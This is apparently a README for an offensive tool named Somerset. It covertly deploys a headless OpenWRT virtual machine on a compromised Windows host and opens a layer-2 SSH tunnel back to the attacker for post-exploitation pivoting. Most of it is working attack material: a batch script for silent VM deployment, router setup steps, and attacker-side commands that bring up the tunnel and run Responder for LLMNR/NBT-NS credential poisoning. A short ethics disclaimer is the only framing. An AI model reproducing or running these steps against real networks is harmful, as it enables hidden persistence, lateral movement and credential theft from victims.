# Somerset: Offensive Router for Windows Pivoting (Experimental)

Somerset - is a small **ash** script to prepare OpenWRT for an L2 VPN SSH tunnel for post-exploitation against Windows

![](/poc-images/somerset-cover.png)

> Cover

# Disclaimer

All methods and techniques described in this repo are for educational purposes only. The author are not responsible for misuse of this knowledge. Remember that this knowledge should only be used for ethical purposes. Don't risk your life and be careful.

# Scenario

This is a very specific vector of pivoting, which is a quiet installation of VirtualBox on compromised Windows. The attacker then creates a virtual machine with OpenWRT in the same quiet mode by connecting a specially prepared OpenWRT VDI disk. It is important to realize that this vector requires local administrator rights on a Windows machine.

The most important point here is for the OpenWRT interface in the Vbox to be in post mode and not have an promiscuous mode. This is necessary to initiate exactly the L2 tunnel to conduct link layer attacks, utilize Responder, and so on. This vector is good because it works from anywhere in the infrastructure, since everything will be encapsulated in the SSH tunnel.

It is important to prepare a VDI image in advance. You can convert it from `.img`, here is an example:

I used the OpenWRT image version 19.07.6:

```powershell
C:\Program Files\Oracle\VirtualBox>vboxmanage.exe convertdd "C:\openwrt\openwrt.img" "C:\openwrt\openwrt.vdi" 

Creating dynamic image with size 285736960 bytes (273MB)...
```

```powershell
C:\Program Files\Oracle\VirtualBox>vboxmanage.exe modifyhd --resize 512 "C:\openwrt\openwrt.vdi" 
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
```

![](/poc-images/research-scheme.jpg)

> Research Scheme

# SSH Dropbear Issue

By default, OpenWRT uses the dropbear implementation for SSH. It does not know how to work with SSH tunnels. Therefore, it will be replaced by `openssh-server`

# Script Mechanics

This script turns an OpenWRT router into an SSH pivoting tool. It does the following:

1) Installation of necessary packages: `ss`, `ip-full`, `kmod-tun`, `openssh-server`
2) Turns off unnecessary DNS and HTTP services, they will only interfere with the pivoting process
3) Replaces `dropbear`, changes its port to 2222, shuts down the daemon. That is, it replaces `dropbear` with `openssh-server`
4) Configuring interfaces. OpenWRT already has a `br-lan` bridge. The task is to create a tap0-interface, enable it and move it to this bridge. And also to activate the unshared mode everywhere.

You should also configure `rc.local` to get the address automatically when you start OpenWRT. This is very important when you deploy the router to a victim. You will need to find this address from the target network. You can scan port 22, since it will always be used on OpenWRT.

```
vi rc.local

udhcpc -i br-lan
echo "nameserver 8.8.8.8" > /etc/resolv.conf

exit 0
```


# Silent OpenWRT Deployment

A small .bat script to automate the creation of an OpenWRT virtual machine

### wrt_vbox_deploy.bat

View the list of adapters in the system

```powershell
Get-NetAdapter
```

```powershell
@echo off

set VMNAME=Somerset
set VMMEMORY=512
set VMCPUS=1
set VMDISK=C:\openwrt\openwrt.vdi
set VMNIC1=bridged
set VMADAPTER1=" " # Specify here the interface of the real Windows
set VMPROMISC1=allow-all

"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" createvm --name "%VMNAME%" --register
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "%VMNAME%" --memory %VMMEMORY% --cpus %VMCPUS%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" storagectl "%VMNAME%" --name "SATA Controller" --add sata --controller IntelAHCI
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" storageattach "%VMNAME%" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium "%VMDISK%"
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "%VMNAME%" --nic1 %VMNIC1%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "%VMNAME%" --bridgeadapter1 %VMADAPTER1%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "%VMNAME%" --nicpromisc1 %VMPROMISC1%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm "%VMNAME%" --type headless
```

```powershell
C:\openwrt\wrt_vbox_deploy.bat
```

# Tunnel Init

For the script to work correctly, it must be processed for execution in the ASH shell. You need to send this ASH script to OpenWRT somehow, I don't think you'll have a problem with that. You can even use `vsftpd` for that.

```bash
caster@kali:~$ ssh root@<OpenWRT IP>
```

```
root@OpenWrt:/# sed -i 's/\r//' somerset.ash
root@OpenWrt:/# chmod +x somerset.ash
root@OpenWrt:/# ash somerset.ash
```

You don't have to worry about silence on the OpenWRT side. It doesn't make noise on the air, it doesn't even transmit hostname via DHCP. After running the script, a tap0-interface will be prepared. Now it is the attacker's task to initiate the tunnel from his side.

## Attacker Side

It is also important to create a /32 route to the OpenWRT endpoint before initiating the SSH tunnel to avoid disconnecting the connection

```bash
caster@kali:~$ sudo route add -net <openwrt_ip> netmask 255.255.255.255 gw <gw_ip>
```

```bash
caster@kali:~$ sudo ssh -oHostKeyAlgorithms=+ssh-rsa -oTunnel=ethernet -w 0:0 root@<OpenWRT IP>
caster@kali:~$ sudo ip link set tap0 up
caster@kali:~$ sudo dhclient -v tap0; sudo route del default
caster@kali:~$ sudo responder -I tap0 -vvv
```

# Proof of Concept (LLMNR/NBT-NS Poisoning, Scanning)

![](/poc-images/cursedpivoting-dhcpaddr.png)

> Address received

![](/poc-images/cursedpivoting-responder.png)

> LLMNR/NBT-NS Poisoning

![](/poc-images/cursedpivoting-netdiscover.png)

> ARP Scanning

# Outro

This is an extremely specific vector of pivoting, however I have proven its practicality.
